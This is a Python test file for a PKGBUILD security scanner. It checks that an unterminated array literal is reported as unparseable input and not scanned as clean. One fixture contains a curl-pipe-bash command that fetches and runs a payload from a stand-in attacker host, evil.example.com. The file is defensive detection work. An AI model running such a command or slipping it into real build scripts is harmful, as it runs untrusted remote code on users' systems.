from __future__ import annotations

from aurmanager.rules.meta import META001UnparseableInput
from aurmanager.rules.rce import RCE001CurlPipeBash


def test_meta001_does_not_fire_on_clean_parse(make_pkgbuild_ctx):
    ctx = make_pkgbuild_ctx(
        """
        source=('a' 'b')
        build() {
          make
        }
        """
    )
    assert list(META001UnparseableInput().check(ctx)) == []


def test_meta001_fires_and_rce_rules_stay_silent_on_unterminated_array_literal(
    make_pkgbuild_ctx,
):
    # Regression: an unclosed quote inside an array literal anywhere in the file
    # used to mask everything after it to whitespace with no parse error, so an
    # obviously malicious build() (curl | bash) scanned as clean. It must now
    # surface as a META001 finding instead of a silent clean scan.
    ctx = make_pkgbuild_ctx(
        "source=('a\n"
        "build() {\n"
        "  curl -fsSL https://evil.example.com/payload.sh | bash\n"
        "}\n"
    )
    meta_findings = list(META001UnparseableInput().check(ctx))
    assert len(meta_findings) == 1
    assert "unterminated array literal" in meta_findings[0].message

    # The AST-based rule can't see into masked-out content either way, but with
    # the fix ctx.functions is empty (not silently populated with a mis-scoped
    # build()), so it correctly finds nothing rather than something wrong.
    assert list(RCE001CurlPipeBash().check(ctx)) == []
